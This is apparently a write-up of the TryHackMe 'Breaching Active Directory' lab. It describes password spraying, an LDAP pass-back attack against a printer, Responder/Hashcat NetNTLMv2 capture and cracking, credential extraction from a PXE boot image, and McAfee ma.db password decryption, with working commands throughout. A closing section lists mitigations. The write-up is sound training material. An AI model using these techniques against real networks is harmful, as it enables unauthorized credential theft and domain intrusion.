# TryHackMe: Breaching Active Directory — Writeup

**Room:** [Breaching Active Directory](https://tryhackme.com/room/breachingad)
**Category:** Active Directory / Red Team
**Difficulty:** Medium

## Overview

This room walks through five distinct techniques for obtaining an initial set of valid Active Directory credentials — the "breach" phase that precedes AD enumeration and lateral movement. Rather than focusing on privilege escalation once inside, the goal here is purely to answer: *how do you get your first foothold into a domain?*

Techniques covered:

1. NTLM-authenticated service password spraying
2. LDAP pass-back attack against a network printer
3. NetNTLM capture and offline cracking (Responder + Hashcat)
4. Credential extraction from an MDT PXE boot image
5. Credential extraction from a McAfee configuration database (`ma.db`)

## Environment Setup

Rather than using the browser-based AttackBox, this walkthrough was done from a local Kali installation running under **WSL2 on Windows 10**, connected to the THM network via OpenVPN. A few environment-specific issues came up that are worth documenting for anyone doing the same:

- **WSL2 auto-regenerates `/etc/resolv.conf`** on every restart, wiping out manually-added DNS entries. Fixed by disabling this behavior in `/etc/wsl.conf`:
  ```ini
  [boot]
  systemd=true

  [user]
  default=<username>

  [network]
  generateResolvConf = false
  ```
  DNS was then set manually to point at the domain controller, with a public resolver as a fallback for general internet access:
  ```bash
  echo "nameserver <THMDC_IP>" | sudo tee /etc/resolv.conf
  echo "nameserver 1.1.1.1" | sudo tee -a /etc/resolv.conf
  ```

- **`wsl --shutdown` kills all running processes**, including any active OpenVPN session — worth remembering, since it means reconnecting the VPN after every WSL restart.

- THM provisions a **room-specific OpenVPN profile** per network (e.g. `breaching_ad_v2`). A generic/previously-downloaded `.ovpn` file will connect to the VPN service but route to the wrong subnet entirely — confirmed by checking the pushed routes (`route` lines in the `PUSH_REPLY` from the OpenVPN handshake) and cross-referencing against the target IP ranges.

## Task 3 — NTLM Authenticated Services

An internet-facing web application at `ntlmauth.za.tryhackme.com` prompts for Windows Authentication (NetNTLM). Given a username list from an OSINT exercise and a known onboarding password (`Changeme123`), a password spraying attack was staged using the room's provided Python script and the `requests_ntlm` library.

```bash
pip install requests requests_ntlm --break-system-packages
python3 ntlm_passwordspray.py -u usernames.txt -f za.tryhackme.com -p Changeme123 -a http://ntlmauth.za.tryhackme.com/
```

**Result:** 4 valid credential pairs recovered via password spray. Success was confirmed by observing an HTTP 200 response with body `Hello World`, versus HTTP 401 for failed attempts — retrievable directly via `requests_ntlm` in Python since curl on Kali is not compiled with NTLM support:

```python
import requests
from requests_ntlm import HttpNtlmAuth
r = requests.get('http://ntlmauth.za.tryhackme.com/', auth=HttpNtlmAuth('za.tryhackme.com\\<user>', 'Changeme123'))
```

**Key takeaway:** NetNTLM is the challenge-response mechanism built on NTLM. Exposed internet-facing services using it (OWA, RDP, custom web apps) are a viable target for both credential validation (post-OSINT) and direct password spraying, since account lockout policies push attackers toward "one password, many usernames" rather than traditional brute force.

## Task 4 — LDAP Pass-back Attack

A network printer's web admin panel (`http://printer.za.tryhackme.com/settings.aspx`) exposed an LDAP configuration page without requiring authentication. While the bound service account password was masked in the UI, the **Server** field controlling where the printer sends its LDAP bind request was fully attacker-controllable.

**Attack chain:**

1. Stood up a rogue OpenLDAP server (`slapd`), configured for the target domain name.
2. Downgraded the server's supported SASL mechanisms to force plaintext auth:
   ```
   dn: cn=config
   replace: olcSaslSecProps
   olcSaslSecProps: noanonymous,minssf=0,passcred
   ```
   ```bash
   sudo ldapmodify -Y EXTERNAL -H ldapi:// -f olcSaslSecProps.ldif
   sudo service slapd restart
   ```
3. Repointed the printer's LDAP server field to the rogue server's IP by directly POSTing the ASP.NET WebForm (extracting fresh `__VIEWSTATE`/`__EVENTVALIDATION` tokens each attempt, since they're single-use):
   ```bash
   curl -sL http://printer.za.tryhackme.com/settings.aspx -c cookies.txt -o settings.html
   # extract VIEWSTATE, VIEWSTATEGENERATOR, EVENTVALIDATION via grep -oP
   curl -s -b cookies.txt http://printer.za.tryhackme.com/settings \
     --data-urlencode "__VIEWSTATE=$VIEWSTATE" \
     --data-urlencode "txtServer=<attacker_IP>" \
     --data-urlencode "btnTestSettings=Test Settings" ...
   ```
4. Captured the resulting authentication attempt with `tcpdump`:
   ```bash
   sudo tcpdump -SX -i <vpn_iface> tcp port 389
   ```

The printer first attempted a SASL/NTLM bind (rejected, since our rogue server only advertises `LOGIN`/`PLAIN`), then fell back and transmitted the bind in cleartext on a subsequent connection attempt.

**Result:** Recovered `za.tryhackme.com\svcLDAP` credentials directly from the wire in plaintext.

**Key takeaway:** LDAP pass-back attacks are distinct from Windows Authentication (NTLM) attacks because the *client device* (printer, scanner, etc.) holds credentials and initiates outbound authentication on command — meaning an attacker who controls the destination server field can coerce a live credential submission, provided the negotiated auth mechanism can be downgraded.

## Task 5 — Authentication Relays (Responder)

Simulated an LLMNR/NBT-NS poisoning scenario using **Responder**, capturing a NetNTLMv2 challenge-response from a periodic simulated authentication event on the VPN network.

```bash
sudo python3 Responder.py -I <vpn_iface> -v
```

After several minutes:

```
[SMB] NTLMv2-SSP Username : ZA\svcFileCopy
[SMB] NTLMv2-SSP Hash     : svcFileCopy::ZA:<challenge>:<HMAC>:<blob>
```

The captured hash was then cracked offline with Hashcat against the room-provided wordlist:

```bash
hashcat -m 5600 hash.txt passwordlist.txt --force
hashcat -m 5600 hash.txt --show
```

**Result:** Cracked `svcFileCopy`'s NetNTLMv2 hash to recover the plaintext password.

**Key takeaway:** LLMNR/NBT-NS poisoning exploits legacy fallback name-resolution protocols that Windows hosts use when standard DNS resolution fails. Any host on the broadcast domain can respond to these queries, redirecting authentication attempts to a rogue listener. Captured NetNTLMv2 hashes are not directly usable for pass-the-hash but can be cracked offline if the underlying password is weak.

## Task 6 — Microsoft Deployment Toolkit (PXE Boot)

MDT/PXE deployments are configured via BCD (Boot Configuration Data) files served over HTTP/TFTP, which can leak the deployment share and its associated service account credentials.

**Attack chain (performed via SSH access to a jump host, THMJMP1):**

1. Enumerated available BCD files via the PXE boot web listing:
   ```
   http://pxeboot.za.tryhackme.com
   ```
2. Retrieved the x64 BCD file over TFTP:
   ```cmd
   tftp -i <MDT_IP> GET "\Tmp\x64{GUID}.bcd" conf.bcd
   ```
3. Used **PowerPXE** to parse the BCD file and locate the boot WIM image:
   ```powershell
   Import-Module .\PowerPXE.ps1
   Get-WimFile -bcdFile conf.bcd
   ```
4. Downloaded the full boot image (a legitimate bootable WIM, ~340MB) via TFTP:
   ```powershell
   tftp -i <MDT_IP> GET "\Boot\x64\Images\LiteTouchPE_x64.wim" pxeboot.wim
   ```
5. Extracted embedded deployment credentials from `Bootstrap.ini` inside the image:
   ```powershell
   Get-FindCredentials -WimFile pxeboot.wim
   ```

**Result:** Recovered `svcMDT` credentials embedded in the unattended deployment configuration.

**Key takeaway:** PXE boot images are often built with an unattended install service account baked directly into `Bootstrap.ini` for automation purposes. Since these images are served without authentication over TFTP (by design, since machines request them pre-domain-join), anyone who can reach the MDT server on the network can retrieve and mine them for credentials — no prior AD access required.

## Task 7 — Configuration Files (McAfee ma.db)

Endpoint security agents (McAfee Endpoint Security in this case) store credentials used to phone home to their management orchestrator in a local SQLite database.

**Attack chain:**

1. Pulled the database file from the jump host over SCP:
   ```bash
   scp thm@THMJMP1.za.tryhackme.com:C:/ProgramData/McAfee/Agent/DB/ma.db .
   ```
2. Queried the `AGENT_REPOSITORIES` table directly with `sqlite3`:
   ```bash
   sqlite3 ma.db "SELECT DOMAIN, AUTH_USER, AUTH_PASSWD FROM AGENT_REPOSITORIES;"
   ```
   This returned `svcAV` and a base64-encoded, encrypted password blob.
3. Decrypted the password using McAfee's known static XOR + 3DES scheme (the original PoC script needed light Python 2→3 porting — bytes handling for the XOR routine and DES3 key material):
   ```bash
   python3 mcafee_sitelist_pwd_decrypt.py "<AUTH_PASSWD value>"
   ```

**Result:** Recovered `svcAV` credentials in plaintext.

**Key takeaway:** McAfee (and similar centrally-managed EDR/AV agents) historically used a **static, publicly known encryption key** to obscure orchestrator credentials at rest — security through obscurity rather than genuine secrecy. Any local access to an endpoint (even non-administrative, depending on file ACLs) can be enough to recover domain service account credentials this way.

## Summary of Recovered Accounts

| Technique | Account | Vector |
|---|---|---|
| NTLM Password Spray | 4 valid accounts | Public-facing NTLM auth + weak onboarding password |
| LDAP Pass-back | `svcLDAP` | Unauthenticated printer admin panel |
| NetNTLM Capture/Crack | `svcFileCopy` | LLMNR/NBT-NS poisoning + offline cracking |
| MDT/PXE Extraction | `svcMDT` | Unauthenticated TFTP + embedded deployment creds |
| Config File Extraction | `svcAV` | Local file access + known static decryption key |

## Mitigations

- **User awareness training** — reduce the odds of credential disclosure via phishing or public forums.
- **Limit internet exposure of AD-integrated services** — NTLM/LDAP-authenticated apps should sit behind a VPN with MFA, not face the open internet.
- **Network Access Control (NAC)** — prevent rogue devices (like a laptop running Responder or a rogue LDAP server) from joining the internal network at all.
- **Enforce SMB signing** — closes off SMB relay attacks entirely, regardless of captured/relayed NTLM challenges.
- **Principle of least privilege** — service accounts (svcLDAP, svcMDT, svcAV, etc.) should have the minimum possible domain permissions, so a compromised service account credential has limited blast radius even when (not if) it's eventually recovered by an attacker.

## Tools Used

- `openvpn` — network access
- `requests` / `requests_ntlm` (Python) — NTLM password spraying and manual auth testing
- `slapd` / `ldap-utils` (OpenLDAP) — rogue LDAP server for pass-back attack
- `tcpdump` — plaintext credential capture
- `Responder` — LLMNR/NBT-NS/MDNS poisoning and NetNTLMv2 capture
- `hashcat` — offline NetNTLMv2 cracking
- `PowerPXE` — BCD/WIM parsing and embedded credential extraction
- `sqlite3` — McAfee `ma.db` inspection
- `pycryptodome` — McAfee password decryption (3DES + XOR)

---
*Writeup based on hands-on completion of the TryHackMe "Breaching Active Directory" room, run from a local Kali (WSL2) attack box rather than the browser-based AttackBox.*
